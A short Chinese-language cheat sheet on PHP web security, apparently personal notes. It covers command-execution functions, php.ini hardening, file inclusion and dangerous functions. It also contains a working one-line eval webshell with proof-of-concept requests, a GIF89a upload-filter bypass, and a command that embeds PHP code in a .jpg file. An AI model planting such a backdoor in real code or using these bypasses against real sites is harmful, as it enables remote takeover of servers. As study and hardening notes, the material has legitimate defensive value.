---
title: "php"
date: 2016-01-25 14:15
---

## 一句话后门

```php
$cmd = $_POST['cmd'];                                                      
eval("$cmd;");

poc:
? cmd=echo phpinfo()  
? cmd=echo exec("ls -l")
```

## 执行系统命令（命令注入攻击）



* shell_exec()

> string shell_exec ( string $cmd )

命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。

* system()

> string system ( string $command [, int &$return_var ］)

成功则返回命令输出的结果， 失败则返回 FALSE

* exec() 

> string exec( string $command [, array &$output [, int &$return_var ］)

返回命令执行结果的最后一行内容

* passthru

> void passthru ( string $command [, int &$return_var ］ )

直接将结果输出到游览器,不返回任何值

* popen()

* proc_open()

* `(反撇号)

```
echo `ls -l`;
```



** for security**

* php.ini

```
safe_mode = On      #safe mode
safe_mode_exec_dir = /usr/local/php/bin/    #limit path

disable_functions="eval,phpinfo"
```

* 使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令

    + escapeshellcmd()针对的是执行的系统命令

    + escapeshellarg()针对的是执行系
    
## upload

** bypass **

* 文件头+GIF89a

## file inclusion

require找不到被包含的文件时会产生致命错误，并停止脚本运行。

include找不到被包含的文件时只会产生警告，脚本将继续运行。

include_once与include类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。

require_once与require类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含


## dangerous functions

* file_get_contents()

> string file_get_contents ( string $filename [, bool $use_include_path = false [, resource $context [, int $offset = -1 [, int $maxlen ]]]] )

支持本地文件，HTTP，FTP

禁用file_get_contents,修改php.ini

```
allow_url_fopen=Off
```

* curl

支持 FTP(S),HTTP(S),TELNET,FILE,DICT,LDAP,GOPHER

install: sudo apt-get install php5-curl. then restart apache

## 备注

* 注入php 到图片等

```
echo '<?php phpinfo();?>' >> 1.jpg
```

文件名后缀改为**.php**，就会用php方式解析，执行phpinfo().
